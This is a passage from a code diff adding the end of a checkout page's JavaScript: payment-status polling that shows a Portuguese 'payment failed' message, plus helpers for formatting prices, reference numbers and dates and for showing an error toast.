+        }, 2000);
+
+      } else if (data.status === 'FAILED') {
+        clearInterval(pollInterval);
+        if (timerInterval) clearInterval(timerInterval);
+        const statusEl = document.getElementById('paymentStatus');
+        if (statusEl) {
+          statusEl.innerHTML = `
+            <div class="ck-status-dot expired"></div>
+            <span>Pagamento falhou. <a href="checkout.html" style="color:#CC0033;font-weight:600">Tentar novamente</a></span>
+          `;
+        }
+      }
+    } catch(e) { /* silent */ }
+  }, 5000);
+}
+
+// ========== HELPERS ==========
+function formatPrice(val) {
+  return Number(val).toFixed(2).replace('.', ',');
+}
+
+function formatReference(ref) {
+  return ref.replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
+}
+
+function formatDate(dateStr) {
+  if (!dateStr) return '--';
+  const d = new Date(dateStr);
+  return `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()}`;
+}
+
+function showError(msg) {
+  let toast = document.querySelector('.ck-error-toast');
+  if (!toast) {
+    toast = document.createElement('div');
+    toast.className = 'ck-error-toast';
+    document.body.appendChild(toast);
+  }
+  toast.textContent = msg;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+// ========== INIT ==========
+renderStep(1);
+</script>
+</body>
+</html>
